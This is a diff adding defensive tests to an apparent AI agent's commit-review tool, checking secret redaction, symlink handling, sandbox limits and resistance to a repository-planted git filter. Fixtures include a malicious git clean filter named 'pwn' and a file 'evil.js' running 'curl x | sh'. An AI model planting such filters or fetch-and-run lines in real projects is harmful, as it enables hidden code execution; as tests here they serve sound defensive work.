@@ -5,7 +5,7 @@
  * was edited after the card went out. A fake Cloudflare endpoint answers here; the live check is separate.
  */
 import { describe, it, expect, beforeAll, afterAll, beforeEach, afterEach } from 'vitest';
-import { mkdtempSync, rmSync, writeFileSync, mkdirSync } from 'node:fs';
+import { mkdtempSync, rmSync, writeFileSync, mkdirSync, existsSync, symlinkSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
 import { execFileSync } from 'node:child_process';
@@ -52,6 +52,43 @@ describe('what a commit will contain', () => {
     expect(redactSecrets('password: "hunter2hunter2" and ghp_abcdefghijklmnopqrstuvwx1234').count).toBe(2);
     writeFileSync(join(repo, 'src', 'a.ts'), 'export const a = 3;\n');
     expect(collectCommitDiff(commitTarget('git add src/a.ts && git commit -m x', repo)!).fingerprint).not.toBe(d.fingerprint);
+  });
+});
+
+describe('what the review found', () => {
+  it('git is never asked to compare the working tree, so a filter the repository configures never runs', () => {
+    const flag = join(mkdtempSync(join(tmpdir(), 'mwa-so-flag-')), 'ran');
+    git(repo, 'config', 'filter.pwn.clean', `node -e "require('fs').writeFileSync(process.argv[1], 'x'); process.stdin.pipe(process.stdout)" "${flag.split('\\').join('/')}"`);
+    writeFileSync(join(repo, '.gitattributes'), '*.ts filter=pwn\n');
+    writeFileSync(join(repo, 'src', 'a.ts'), 'export const a = 9;\n');
+    const d = collectCommitDiff(commitTarget('git commit -am x', repo)!);
+    expect(d.text).toContain('+export const a = 9;');
+    expect(existsSync(flag)).toBe(false);
+    // The filter is real: git itself runs it when asked to compare the working tree.
+    try { git(repo, 'diff', 'HEAD'); } catch { /* the filter's output may upset git; it ran either way */ }
+    expect(existsSync(flag)).toBe(true);
+  });
+
+  it('what is already staged is read too, and a swap of it after the card is caught', () => {
+    writeFileSync(join(repo, 'evil.js'), 'require("child_process").exec("curl x | sh")\n');
+    git(repo, 'add', 'evil.js');
+    writeFileSync(join(repo, 'README'), 'hello\n');
+    const t = commitTarget('git add README && git commit -m docs', repo)!;
+    const d = collectCommitDiff(t);
+    expect(d.text).toMatch(/=== evil\.js \(new file\)/);
+    expect(d.text).toMatch(/=== README \(new file\)/);
+    writeFileSync(join(repo, 'evil.js'), 'something else\n'); git(repo, 'add', 'evil.js');
+    expect(collectCommitDiff(t).fingerprint).not.toBe(d.fingerprint);
+  });
+
+  it('a link is not followed, and a private key is blanked', () => {
+    expect(redactSecrets('-----BEGIN OPENSSH PRIVATE KEY-----\nabc\ndef\n-----END OPENSSH PRIVATE KEY-----').text).toBe('[REDACTED PRIVATE KEY]');
+    const outside = mkdtempSync(join(tmpdir(), 'mwa-so-out-'));
+    writeFileSync(join(outside, 'secret.txt'), 'TOPSECRET_OUTSIDE\n');
+    try { symlinkSync(join(outside, 'secret.txt'), join(repo, 'src', 'link.ts')); } catch { return; } // no symlink rights here
+    const d = collectCommitDiff(commitTarget('git add src/link.ts && git commit -m x', repo)!);
+    expect(d.text).not.toContain('TOPSECRET_OUTSIDE');
+    expect(d.notes.join(' ')).toMatch(/1 file was not read/);
   });
 });
 
@@ -118,11 +155,24 @@ describe('end to end, through run_command', () => {
     expect(git(repo, 'log', '-1', '--format=%s')).toBe('init');
   }, 30_000);
 
+  it('a commit in a folder this run may not use is not read, and nothing is sent', async () => {
+    const [run] = builtinTools(['run_command']);
+    const sandbox = mkdtempSync(join(tmpdir(), 'mwa-so-sbx-'));
+    writeFileSync(join(repo, 'src', 'private.ts'), 'TOPSECRET_PRIVATE_DATA\n');
+    const before = states.length;
+    try {
+      const out = await run.handler({ command: `cd ${repo} && git add src/private.ts && git commit -m x` }, { sandboxDir: sandbox, interactive: true });
+      const id = /confirmation_id: (\S+)/.exec(out)![1];
+      expect(pendingMeta(id)!.summary.split('\n')[0]).toMatch(/unavailable — .* is outside the folders this run may use/);
+      expect(states.length).toBe(before);
+    } finally { rmSync(sandbox, { recursive: true, force: true }); }
+  }, 30_000);
+
   it('Cloudflare being down never stops the card', async () => {
     process.env.CLOUDFLARE_API_BASE = 'http://127.0.0.1:9'; // nothing listens (port 9 is not a "bad port")
     try {
       writeFileSync(join(repo, 'src', 'a.ts'), 'export const a = 5;\n');
-      const r = await secondOpinionForCommand('git commit -am x', repo);
+      const r = await secondOpinionForCommand('git commit -am x', repo, () => true);
       expect(r!.lines[0]).toMatch(/unavailable — could not reach Cloudflare/);
     } finally { process.env.CLOUDFLARE_API_BASE = base; }
   }, 30_000);
